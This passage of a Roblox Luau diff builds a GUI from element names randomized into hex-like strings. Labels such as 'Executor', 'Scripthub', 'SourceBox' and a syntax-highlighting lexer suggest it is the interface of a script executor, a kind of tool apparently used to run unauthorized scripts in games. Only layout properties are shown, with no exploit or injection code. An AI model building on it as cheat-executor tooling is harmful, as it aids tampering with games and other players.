+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.Position = UDim2.new(0.5, 0, 0, 45);
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.ScaleType = Enum.ScaleType.Fit;
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.Image = "rbxassetid://4370346095";
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.ImageContent = Content;
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.Parent = fd4hh21cgefg.db986e41d71ch3b32d7e662f;
+
+fd4hh21cgefg.bb263.Name = "Hitbox";
+fd4hh21cgefg.bb263.AutoButtonColor = true;
+fd4hh21cgefg.bb263.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.bb263.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bb263.BackgroundTransparency = 1;
+fd4hh21cgefg.bb263.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.bb263.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bb263.Text = "";
+fd4hh21cgefg.bb263.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.bb263.TextTransparency = 1;
+fd4hh21cgefg.bb263.Parent = fd4hh21cgefg.d5a5d6de7b8h948e70523c9;
+
+fd4hh21cgefg.cb14416d4545f7.Name = "SettingsBtn";
+fd4hh21cgefg.cb14416d4545f7.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.cb14416d4545f7.Size = UDim2.new(0, 20, 0, 20);
+fd4hh21cgefg.cb14416d4545f7.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.cb14416d4545f7.BackgroundTransparency = 1;
+fd4hh21cgefg.cb14416d4545f7.Position = UDim2.new(0.5, 0, 0, 85);
+fd4hh21cgefg.cb14416d4545f7.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.cb14416d4545f7.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.cb14416d4545f7.ScaleType = Enum.ScaleType.Fit;
+fd4hh21cgefg.cb14416d4545f7.Image = "rbxassetid://3605022185";
+fd4hh21cgefg.cb14416d4545f7.ImageContent = Content;
+fd4hh21cgefg.cb14416d4545f7.Parent = fd4hh21cgefg.db986e41d71ch3b32d7e662f;
+
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.Name = "Hitbox";
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.AutoButtonColor = true;
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.BackgroundTransparency = 1;
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.Text = "";
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.TextTransparency = 1;
+fd4hh21cgefg.f7fhb8c3f9fa89afd05hh0h7e4ff8e25.Parent = fd4hh21cgefg.cb14416d4545f7;
+
+fd4hh21cgefg.a5334e.Name = "bg";
+fd4hh21cgefg.a5334e.AutoButtonColor = true;
+fd4hh21cgefg.a5334e.Active = false;
+fd4hh21cgefg.a5334e.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.a5334e.ZIndex = 0;
+fd4hh21cgefg.a5334e.Size = UDim2.new(0, 25, 0, 25);
+fd4hh21cgefg.a5334e.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a5334e.Selectable = false;
+fd4hh21cgefg.a5334e.BackgroundTransparency = 1;
+fd4hh21cgefg.a5334e.Position = UDim2.new(0.5, 0, 0, 5);
+fd4hh21cgefg.a5334e.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a5334e.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a5334e.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.a5334e.SliceScale = 0.07000000029802322;
+fd4hh21cgefg.a5334e.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.a5334e.ImageContent = Content;
+fd4hh21cgefg.a5334e.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.a5334e.Parent = fd4hh21cgefg.db986e41d71ch3b32d7e662f;
+
+fd4hh21cgefg.f92d0ca.Name = "UICorner";
+fd4hh21cgefg.f92d0ca.CornerRadius = UDim.new(0, 5);
+fd4hh21cgefg.f92d0ca.Parent = fd4hh21cgefg.dd9b25856344cgg0;
+
+fd4hh21cgefg.cbe8abe5g3.Name = "BodyClipping";
+fd4hh21cgefg.cbe8abe5g3.Size = UDim2.new(1, -43, 1, -32);
+fd4hh21cgefg.cbe8abe5g3.ClipsDescendants = true;
+fd4hh21cgefg.cbe8abe5g3.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.cbe8abe5g3.BackgroundTransparency = 1;
+fd4hh21cgefg.cbe8abe5g3.Position = UDim2.new(0, 43, 0, 32);
+fd4hh21cgefg.cbe8abe5g3.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.cbe8abe5g3.Parent = fd4hh21cgefg.dd9b25856344cgg0;
+
+fd4hh21cgefg.h42155205e75hccg1g9a.Name = "Executor";
+fd4hh21cgefg.h42155205e75hccg1g9a.ZIndex = 2;
+fd4hh21cgefg.h42155205e75hccg1g9a.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.h42155205e75hccg1g9a.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h42155205e75hccg1g9a.BackgroundTransparency = 1;
+fd4hh21cgefg.h42155205e75hccg1g9a.Position = UDim2.new(0, 0, -0.00300000003, 0);
+fd4hh21cgefg.h42155205e75hccg1g9a.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h42155205e75hccg1g9a.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h42155205e75hccg1g9a.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.h42155205e75hccg1g9a.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.h42155205e75hccg1g9a.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.h42155205e75hccg1g9a.ImageContent = Content;
+fd4hh21cgefg.h42155205e75hccg1g9a.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.h42155205e75hccg1g9a.Parent = fd4hh21cgefg.cbe8abe5g3;
+
+fd4hh21cgefg.ehd26ehd9cc4h0d6h3be87590dg4a.Name = "Borders";
+fd4hh21cgefg.ehd26ehd9cc4h0d6h3be87590dg4a.Parent = fd4hh21cgefg.h42155205e75hccg1g9a;
+
+fd4hh21cgefg.b3890fg63ce4h67g8h1f9eh37.Name = "Frame";
+fd4hh21cgefg.b3890fg63ce4h67g8h1f9eh37.Size = UDim2.new(0, 9, 0, 313);
+fd4hh21cgefg.b3890fg63ce4h67g8h1f9eh37.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.b3890fg63ce4h67g8h1f9eh37.BorderSizePixel = 0;
+fd4hh21cgefg.b3890fg63ce4h67g8h1f9eh37.Position = UDim2.new(-9.13699978e-08, 0, 0, 0);
+fd4hh21cgefg.b3890fg63ce4h67g8h1f9eh37.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.b3890fg63ce4h67g8h1f9eh37.Parent = fd4hh21cgefg.ehd26ehd9cc4h0d6h3be87590dg4a;
+
+fd4hh21cgefg.hfb3f.Name = "Frame";
+fd4hh21cgefg.hfb3f.Size = UDim2.new(0, 663, 0, 6);
+fd4hh21cgefg.hfb3f.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hfb3f.BorderSizePixel = 0;
+fd4hh21cgefg.hfb3f.Position = UDim2.new(-4.59639651e-08, 0, 0, 0);
+fd4hh21cgefg.hfb3f.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hfb3f.Parent = fd4hh21cgefg.ehd26ehd9cc4h0d6h3be87590dg4a;
+
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.Name = "InnerBody";
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.ZIndex = 2;
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.BackgroundTransparency = 1;
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.d4884ed51742h20a622f46232eb24.Parent = fd4hh21cgefg.h42155205e75hccg1g9a;
+
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.Name = "SourceBg";
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.ZIndex = 2;
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.Size = UDim2.new(1, -129, 1, -79);
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.BackgroundTransparency = 1;
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.Position = UDim2.new(0, 10, 0, 38);
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.SliceScale = 0.05000000074505806;
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.ImageContent = Content;
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.h4hgg4bd4ec4a488074f032.Parent = fd4hh21cgefg.d4884ed51742h20a622f46232eb24;
+
+fd4hh21cgefg.h6853acg6g79de6265b9.Name = "Source";
+fd4hh21cgefg.h6853acg6g79de6265b9.LayoutOrder = 1;
+fd4hh21cgefg.h6853acg6g79de6265b9.Active = true;
+fd4hh21cgefg.h6853acg6g79de6265b9.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.h6853acg6g79de6265b9.ZIndex = 2;
+fd4hh21cgefg.h6853acg6g79de6265b9.Size = UDim2.new(1, -7, 1, -9);
+fd4hh21cgefg.h6853acg6g79de6265b9.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h6853acg6g79de6265b9.BorderSizePixel = 0;
+fd4hh21cgefg.h6853acg6g79de6265b9.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.h6853acg6g79de6265b9.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h6853acg6g79de6265b9.ScrollingDirection = Enum.ScrollingDirection.Y;
+fd4hh21cgefg.h6853acg6g79de6265b9.CanvasSize = UDim2.new(0, 0, 0, 0);
+fd4hh21cgefg.h6853acg6g79de6265b9.ScrollBarThickness = 3;
+fd4hh21cgefg.h6853acg6g79de6265b9.Parent = fd4hh21cgefg.h4hgg4bd4ec4a488074f032;
+
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.Name = "ScrollingFrame";
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.Active = true;
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.BorderSizePixel = 0;
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.BackgroundTransparency = 1;
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.CanvasSize = UDim2.new(0, 0, 0, 0);
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.ScrollBarImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.ScrollBarThickness = 5;
+fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9.Parent = fd4hh21cgefg.h6853acg6g79de6265b9;
+
+fd4hh21cgefg.d42688a6beffe2g7g3a.Name = "SourceBox";
+fd4hh21cgefg.d42688a6beffe2g7g3a.LayoutOrder = 5;
+fd4hh21cgefg.d42688a6beffe2g7g3a.ZIndex = 7;
+fd4hh21cgefg.d42688a6beffe2g7g3a.Size = UDim2.new(1, -32, 1, 0);
+fd4hh21cgefg.d42688a6beffe2g7g3a.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d42688a6beffe2g7g3a.BackgroundTransparency = 1;
+fd4hh21cgefg.d42688a6beffe2g7g3a.Position = UDim2.new(0, 32, 0, 0);
+fd4hh21cgefg.d42688a6beffe2g7g3a.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d42688a6beffe2g7g3a.MultiLine = true;
+fd4hh21cgefg.d42688a6beffe2g7g3a.CursorPosition = -1;
+fd4hh21cgefg.d42688a6beffe2g7g3a.TextYAlignment = Enum.TextYAlignment.Top;
+fd4hh21cgefg.d42688a6beffe2g7g3a.ClearTextOnFocus = false;
+fd4hh21cgefg.d42688a6beffe2g7g3a.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d42688a6beffe2g7g3a.Text = "";
+fd4hh21cgefg.d42688a6beffe2g7g3a.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.d42688a6beffe2g7g3a.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.d42688a6beffe2g7g3a.Parent = fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9;
+
+fd4hh21cgefg.g111gg077dce.Name = "Lines";
+fd4hh21cgefg.g111gg077dce.ZIndex = 2;
+fd4hh21cgefg.g111gg077dce.Size = UDim2.new(0, 30, 1, 0);
+fd4hh21cgefg.g111gg077dce.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g111gg077dce.BackgroundTransparency = 1;
+fd4hh21cgefg.g111gg077dce.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g111gg077dce.RichText = true;
+fd4hh21cgefg.g111gg077dce.TextColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g111gg077dce.TextYAlignment = Enum.TextYAlignment.Top;
+fd4hh21cgefg.g111gg077dce.Text = "1";
+fd4hh21cgefg.g111gg077dce.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.g111gg077dce.Parent = fd4hh21cgefg.a5f31c34e2bb2e5ef23gb677fac9;
+
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.Name = "Frame";
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.ZIndex = 2;
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.Size = UDim2.new(0, -1, 1, 0);
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.BorderSizePixel = 0;
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.Position = UDim2.new(1, 0, 0.00100000005, 0);
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d0b173ed5dh667d38a87cc.Parent = fd4hh21cgefg.g111gg077dce;
+
+fd4hh21cgefg.ha17c6ede7db7164f09825ad2b1ha.Name = "ide";
+fd4hh21cgefg.ha17c6ede7db7164f09825ad2b1ha.Parent = fd4hh21cgefg.h6853acg6g79de6265b9;
+
+fd4hh21cgefg.h94ee.Name = "highlight";
+fd4hh21cgefg.h94ee.Parent = fd4hh21cgefg.ha17c6ede7db7164f09825ad2b1ha;
+
+fd4hh21cgefg.bg8ebgc06c9d0g7f0022d4e5a36.Name = "lexer";
+fd4hh21cgefg.bg8ebgc06c9d0g7f0022d4e5a36.Parent = fd4hh21cgefg.h94ee;
+
+fd4hh21cgefg.aa7c8e6322g549af4g02a6g357e051.Name = "language";
+fd4hh21cgefg.aa7c8e6322g549af4g02a6g357e051.Parent = fd4hh21cgefg.bg8ebgc06c9d0g7f0022d4e5a36;
+
+fd4hh21cgefg.h20h7ha0.Name = "Scripthub";
+fd4hh21cgefg.h20h7ha0.AnchorPoint = Vector2.new(1, 0.5);
+fd4hh21cgefg.h20h7ha0.ZIndex = 2;
+fd4hh21cgefg.h20h7ha0.Size = UDim2.new(0, 113, 1, -79);
+fd4hh21cgefg.h20h7ha0.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h20h7ha0.Position = UDim2.new(1, 0, 0.5, 0);
+fd4hh21cgefg.h20h7ha0.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h20h7ha0.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h20h7ha0.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.h20h7ha0.SliceScale = 0.05000000074505806;
+fd4hh21cgefg.h20h7ha0.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.h20h7ha0.ImageContent = Content;
+fd4hh21cgefg.h20h7ha0.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.h20h7ha0.Parent = fd4hh21cgefg.d4884ed51742h20a622f46232eb24;
+
+fd4hh21cgefg.fe9bg29b77270164gg.Name = "Scripts";
+fd4hh21cgefg.fe9bg29b77270164gg.Active = true;
+fd4hh21cgefg.fe9bg29b77270164gg.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.fe9bg29b77270164gg.ZIndex = 2;
+fd4hh21cgefg.fe9bg29b77270164gg.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.fe9bg29b77270164gg.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe9bg29b77270164gg.BorderSizePixel = 0;
+fd4hh21cgefg.fe9bg29b77270164gg.BackgroundTransparency = 1;
+fd4hh21cgefg.fe9bg29b77270164gg.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.fe9bg29b77270164gg.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe9bg29b77270164gg.ScrollingDirection = Enum.ScrollingDirection.Y;
+fd4hh21cgefg.fe9bg29b77270164gg.CanvasSize = UDim2.new(0, 0, 0, 0);
+fd4hh21cgefg.fe9bg29b77270164gg.ScrollBarImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe9bg29b77270164gg.ScrollBarThickness = 3;
+fd4hh21cgefg.fe9bg29b77270164gg.Parent = fd4hh21cgefg.h20h7ha0;
+
+fd4hh21cgefg.b85hhfacbag9bb2g5fgc67f6aege.Name = "UIListLayout";
+fd4hh21cgefg.b85hhfacbag9bb2g5fgc67f6aege.Padding = UDim.new(0, 5);
+fd4hh21cgefg.b85hhfacbag9bb2g5fgc67f6aege.Parent = fd4hh21cgefg.fe9bg29b77270164gg;
+
+fd4hh21cgefg.ed18305a7c7.Name = "dummy";
+fd4hh21cgefg.ed18305a7c7.Active = true;
+fd4hh21cgefg.ed18305a7c7.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.ed18305a7c7.ZIndex = -1;
+fd4hh21cgefg.ed18305a7c7.Size = UDim2.new(0.899999976, 0, 0, 18);
+fd4hh21cgefg.ed18305a7c7.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ed18305a7c7.Selectable = true;
+fd4hh21cgefg.ed18305a7c7.BackgroundTransparency = 1;
+fd4hh21cgefg.ed18305a7c7.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.ed18305a7c7.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.ed18305a7c7.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ed18305a7c7.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.ed18305a7c7.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.ed18305a7c7.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.ed18305a7c7.ImageContent = Content;
+fd4hh21cgefg.ed18305a7c7.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.ed18305a7c7.Parent = fd4hh21cgefg.fe9bg29b77270164gg;
+
+fd4hh21cgefg.e8f0e10bc8.Name = "icon";
+fd4hh21cgefg.e8f0e10bc8.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.e8f0e10bc8.Size = UDim2.new(0, 12, 0, 12);
+fd4hh21cgefg.e8f0e10bc8.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e8f0e10bc8.BackgroundTransparency = 1;
+fd4hh21cgefg.e8f0e10bc8.Position = UDim2.new(0, 5, 0.5, 0);
+fd4hh21cgefg.e8f0e10bc8.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.e8f0e10bc8.Image = "rbxassetid://8150715986";
+fd4hh21cgefg.e8f0e10bc8.ImageContent = Content;
+fd4hh21cgefg.e8f0e10bc8.Parent = fd4hh21cgefg.ed18305a7c7;
+
+fd4hh21cgefg.adah1868686e0564f791bdb6.Name = "Hitbox";
+fd4hh21cgefg.adah1868686e0564f791bdb6.AutoButtonColor = true;
+fd4hh21cgefg.adah1868686e0564f791bdb6.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.adah1868686e0564f791bdb6.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.adah1868686e0564f791bdb6.BackgroundTransparency = 1;
+fd4hh21cgefg.adah1868686e0564f791bdb6.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.adah1868686e0564f791bdb6.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.adah1868686e0564f791bdb6.Text = "";
+fd4hh21cgefg.adah1868686e0564f791bdb6.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.adah1868686e0564f791bdb6.TextTransparency = 1;
+fd4hh21cgefg.adah1868686e0564f791bdb6.Parent = fd4hh21cgefg.ed18305a7c7;
+
+fd4hh21cgefg.hg3ab0h09fdc.Name = "Template";
+fd4hh21cgefg.hg3ab0h09fdc.Size = UDim2.new(1, -30, 1, 0);
+fd4hh21cgefg.hg3ab0h09fdc.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hg3ab0h09fdc.BackgroundTransparency = 1;
+fd4hh21cgefg.hg3ab0h09fdc.Position = UDim2.new(0, 25, 0, 0);
+fd4hh21cgefg.hg3ab0h09fdc.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.hg3ab0h09fdc.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hg3ab0h09fdc.Text = "N/A";
+fd4hh21cgefg.hg3ab0h09fdc.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.hg3ab0h09fdc.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.hg3ab0h09fdc.Parent = fd4hh21cgefg.ed18305a7c7;
+
+fd4hh21cgefg.h1abc42ggh9813haa30e534.Name = "Delete";
+fd4hh21cgefg.h1abc42ggh9813haa30e534.AutoButtonColor = true;
+fd4hh21cgefg.h1abc42ggh9813haa30e534.AnchorPoint = Vector2.new(1, 0.5);
+fd4hh21cgefg.h1abc42ggh9813haa30e534.Size = UDim2.new(0, 18, 0, 18);
+fd4hh21cgefg.h1abc42ggh9813haa30e534.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h1abc42ggh9813haa30e534.BackgroundTransparency = 1;
+fd4hh21cgefg.h1abc42ggh9813haa30e534.Position = UDim2.new(1, 0, 0.5, 0);
+fd4hh21cgefg.h1abc42ggh9813haa30e534.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h1abc42ggh9813haa30e534.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h1abc42ggh9813haa30e534.Image = "rbxassetid://7681033210";
+fd4hh21cgefg.h1abc42ggh9813haa30e534.ImageContent = Content;
+fd4hh21cgefg.h1abc42ggh9813haa30e534.Parent = fd4hh21cgefg.ed18305a7c7;
+
+fd4hh21cgefg.h57c2ag73.Name = "TextBox";
+fd4hh21cgefg.h57c2ag73.Active = true;
+fd4hh21cgefg.h57c2ag73.ZIndex = 2;
+fd4hh21cgefg.h57c2ag73.Size = UDim2.new(0, 104, 0, 23);
+fd4hh21cgefg.h57c2ag73.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h57c2ag73.Selectable = true;
+fd4hh21cgefg.h57c2ag73.Position = UDim2.new(0, 0, 0, -30);
+fd4hh21cgefg.h57c2ag73.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h57c2ag73.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h57c2ag73.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.h57c2ag73.SliceScale = 0.05000000074505806;
+fd4hh21cgefg.h57c2ag73.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.h57c2ag73.ImageContent = Content;
+fd4hh21cgefg.h57c2ag73.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.h57c2ag73.Parent = fd4hh21cgefg.h20h7ha0;
+
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.Name = "TextBox";
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.ZIndex = 2;
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.Size = UDim2.new(0, 88, 0, 23);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.BorderColor3 = Color3.new(1, 0, 0);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.BorderSizePixel = 0;
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.Position = UDim2.new(0.456943214, 0, 0.5, 0);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.PlaceholderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.TextWrapped = true;
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.PlaceholderText = "Search..";
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.ClearTextOnFocus = false;
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.TextTruncate = Enum.TextTruncate.AtEnd;
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.Text = "";
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.c9cd7613117fgd0dabd80519.Parent = fd4hh21cgefg.h57c2ag73;
+
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.Name = "ImageLabel";
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.AnchorPoint = Vector2.new(1, 0.5);
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.ZIndex = 2;
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.Size = UDim2.new(0, 17, 0, 17);
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.BorderColor3 = Color3.new(0, 1, 0);
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.BackgroundTransparency = 1;
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.Position = UDim2.new(1, 0, 0.5, 0);
